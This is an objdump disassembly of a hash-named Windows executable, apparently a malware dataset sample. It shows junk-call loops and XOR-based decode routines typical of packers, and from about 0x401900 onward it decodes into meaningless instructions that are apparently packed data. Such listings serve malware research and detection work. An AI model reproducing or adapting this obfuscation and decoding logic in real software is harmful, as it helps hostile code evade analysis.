
9efaacb833ee6a0c893596862c534c43f0ef2c58291d755e08ee71851d895476.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x425010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x425010
  401020:	inc    eax
  401021:	mov    ds:0x425010,eax
  401026:	cmp    DWORD PTR ds:0x425010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x425010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42500c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x421000
  40105d:	cmp    DWORD PTR ds:0x425010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x425010
  40106f:	inc    eax
  401070:	mov    ds:0x425010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x427010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x427008,0x42601c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x429008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x429008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x429008,ecx
  4010af:	cmp    DWORD PTR ds:0x429008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x429008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x421048
  4010d4:	cmp    DWORD PTR ds:0x429008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x429008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x429008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x427010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x428010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41d1dc
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x429014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x428008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x425024
  40113b:	adc    ecx,DWORD PTR ds:0x427004
  401141:	mov    DWORD PTR ds:0x425024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x42901c
  401150:	sub    DWORD PTR ds:0x42500c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x427004,0x42500c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x429008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x425020,0x1b
  401184:	cmp    DWORD PTR ds:0x425020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x425020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x421004
  4011a7:	mov    ecx,DWORD PTR ds:0x425020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x425020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42501c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42500c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x425024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x428018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x426014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x427010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x425020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x425010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x427014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x426014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x425014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x425000,0x427018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x42901c,0x429008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x428004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x42800c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x426018,0x427004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x429018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x426014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x428018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x425000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x428014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x425020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x425010,0x1f
  401313:	cmp    DWORD PTR ds:0x425010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x425010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x41ff3b
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42104c
  40134b:	mov    edx,DWORD PTR ds:0x425010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x425010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x428008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x425008,0x427004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x426014,0x42701c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x429004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x42801c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x426010
  4013c9:	sbb    DWORD PTR ds:0x42600c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x426018
  4013da:	or     edx,DWORD PTR ds:0x42500c
  4013e0:	mov    DWORD PTR ds:0x426018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x427008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x426010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x425020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x428004
  401417:	sub    DWORD PTR ds:0x42501c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x428004,0x1f
  40143c:	cmp    DWORD PTR ds:0x428004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x428004,0x29
  401450:	jne    0x401466
  401456:	push   0x41ffb1
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x421008
  401466:	mov    ecx,DWORD PTR ds:0x428004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x428004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x429014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42501c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x429018,0x425020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x429010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x429010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x429010,edx
  4014c9:	cmp    DWORD PTR ds:0x429010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x421014
  4014e1:	cmp    DWORD PTR ds:0x429010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x425008,0x0
  401504:	mov    edx,DWORD PTR ds:0x425008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x425008,edx
  401511:	cmp    DWORD PTR ds:0x425008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x41ffd1
  401523:	push   0x41ff0b
  401528:	call   DWORD PTR ds:0x421050
  40152e:	cmp    DWORD PTR ds:0x425008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x429008,0x42900c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x42801c,0x0
  401559:	mov    edx,DWORD PTR ds:0x42801c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x42801c,edx
  401566:	cmp    DWORD PTR ds:0x42801c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x421054
  401583:	cmp    DWORD PTR ds:0x42801c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x426010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x426010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x426010,edx
  4015b7:	cmp    DWORD PTR ds:0x426010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x421018
  4015cd:	cmp    DWORD PTR ds:0x426010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x426000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x425028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x425024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x425024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x425024,edx
  40163b:	cmp    DWORD PTR ds:0x425024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x425024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42101c
  40166b:	cmp    DWORD PTR ds:0x425024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x425024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x425024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x427010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x42900c,0x427008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x425028,0x427010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x426018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	mov    DWORD PTR [edx+0x62626697],ecx
  401912:	bound  esp,QWORD PTR [edx+0x1a]
  401915:	pop    edi
  401916:	bound  esp,QWORD PTR [edx+0x9]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x4018b2
  401922:	jbe    0x40199a
  401924:	stc    
  401925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401926:	jb     0x40199a
  401928:	jno    0x401954
  40192a:	fld    st(0)
  40192c:	std    
  40192d:	dec    esp
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	data16 jnp 0x40196b
  401940:	call   0x26d1:0xfbbbb819
  401947:	hlt    
  401948:	xor    BYTE PTR [ebx+0x5811b5de],bl
  40194e:	dec    ebp
  40194f:	and    bl,cl
  401951:	std    
  401952:	pop    ds
  401953:	int    0x30
  401955:	xor    BYTE PTR [ebx+0x79a0c1de],cl
  40195b:	test   al,0x21
  40195d:	mov    al,ds:0x6ad39963
  401962:	clc    
  401963:	cmp    DWORD PTR [edi-0x74],esi
  401966:	mov    ecx,DWORD PTR [ebx+0x38d84edc]
  40196c:	mov    ecx,0x536582b9
  401971:	mov    ch,0x26
  401973:	idiv   BYTE PTR es:[ebx+0x2a413552]
  40197a:	push   es
  40197b:	arpl   sp,bx
  40197d:	push   edi
  40197e:	jne    0x401920
  401980:	and    ch,bh
  401982:	stos   BYTE PTR es:[edi],al
  401983:	adc    al,0xd1
  401985:	cmp    esi,eax
  401987:	mov    al,0x56
  401989:	dec    edi
  40198a:	ret    
  40198b:	adc    al,0x67
  40198d:	and    ebx,DWORD PTR [eax-0x5a2f20df]
  401993:	jmp    0x43e55a22
  401998:	fwait
  401999:	into   
  40199a:	or     al,0xa3
  40199c:	div    DWORD PTR [edi+0x5]
  40199f:	mov    esi,0x9d47fa53
  4019a4:	add    ebx,esi
  4019a6:	retw   0x3f19
  4019aa:	sti    
  4019ab:	retf   0xf32e
  4019ae:	xor    esi,DWORD PTR [ebx]
  4019b0:	or     edi,edx
  4019b2:	and    BYTE PTR [edx+0x78],ah
  4019b5:	or     BYTE PTR [edi+0x32],bl
  4019b8:	mov    esi,0x71a08cf1
  4019bd:	push   0x5611d370
  4019c2:	fild   DWORD PTR [ecx+0x1fda78bb]
  4019c8:	push   ds
  4019c9:	adc    BYTE PTR [ebx-0xf127007],dl
  4019cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019d0:	mov    ebp,0xc401a53c
  4019d5:	add    DWORD PTR [eax],edx
  4019d7:	jae    0x40197a
  4019d9:	inc    ebp
  4019da:	sub    eax,0x986e30c2
  4019df:	cmp    al,0xa
  4019e1:	cmp    al,0xd3
  4019e3:	test   DWORD PTR ds:0x984d1c51,ebp
  4019e9:	call   0xd3c2:0xca15fc3
  4019f0:	or     BYTE PTR [edx+edx*4+0x6d],0x9f
  4019f5:	mov    ds:0x9a9445e4,al
  4019fa:	and    DWORD PTR [edi-0x1],ebp
  4019fd:	retf   
  4019fe:	rcl    DWORD PTR [edx],0x1
  401a01:	leave  
  401a02:	inc    esi
  401a03:	int3   
  401a04:	and    ecx,eax
  401a06:	push   es
  401a07:	je     0x401a5d
  401a09:	std    
  401a0a:	stc    
  401a0b:	outs   dx,BYTE PTR ds:[esi]
  401a0c:	outs   dx,DWORD PTR ds:[esi]
  401a0d:	xchg   eax,esp
  401a0f:	test   BYTE PTR [ecx+0xd969694],cl
  401a15:	jae    0x401a21
  401a17:	(bad)  
  401a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a1a:	push   eax
  401a1b:	pushf  
  401a1c:	in     al,0x7a
  401a1e:	in     al,0x17
  401a20:	ja     0x401a16
  401a22:	xor    ecx,edx
  401a24:	add    DWORD PTR [esi],0xffffffc8
  401a27:	jb     0x401a01
  401a29:	stos   BYTE PTR es:[edi],al
  401a2a:	fndisi(8087 only) 
  401a2c:	cld    
  401a2d:	shr    DWORD PTR [edx],0x5c
  401a30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a31:	repz mov gs,edi
  401a34:	ret    0x474a
  401a37:	ret    
  401a38:	scas   eax,DWORD PTR es:[edi]
  401a39:	xor    al,0xd1
  401a3b:	es mov dl,0xc6
  401a3e:	(bad)  
  401a40:	inc    ebx
  401a41:	add    DWORD PTR [ebx],ebp
  401a43:	aas    
  401a44:	in     al,0x5b
  401a46:	fcom   QWORD PTR [ebx]
  401a48:	pop    es
  401a49:	xor    esp,DWORD PTR [ecx]
  401a4b:	sbb    ch,dh
  401a4d:	push   edi
  401a4e:	test   DWORD PTR [ebx-0x1bfc350f],esp
  401a54:	cmp    BYTE PTR [esi+0x62],bh
  401a57:	popf   
  401a58:	lds    edi,FWORD PTR [ecx-0x309350a]
  401a5e:	xor    eax,0xbf4ec949
  401a63:	pop    es
  401a64:	sub    DWORD PTR [ecx-0x47d1d1ec],edi
  401a6a:	push   ds
  401a6b:	dec    ecx
  401a6c:	jmp    0x5446:0xc46aa45f
  401a73:	mov    ds:0x90dba76e,al
  401a78:	jge    0x401ac3
  401a7a:	push   ebx
  401a7b:	add    eax,0x3d35eb25
  401a80:	out    dx,eax
  401a81:	jmp    0x11735
  401a86:	aam    0x31
  401a88:	push   ss
  401a89:	push   esi
  401a8a:	imul   esi,eax,0xffffffb3
  401a8d:	xor    DWORD PTR [eax],0xffffffef
  401a90:	push   ebp
  401a91:	push   eax
  401a92:	outs   dx,BYTE PTR ds:[esi]
  401a93:	sbb    BYTE PTR [edx+0x329837c0],cl
  401a99:	call   0x86d3:0x936ee124
  401aa0:	add    DWORD PTR [edx],ebx
  401aa2:	xor    edx,esi
  401aa4:	xchg   edx,eax
  401aa5:	fcmovnu st,st(6)
  401aa7:	das    
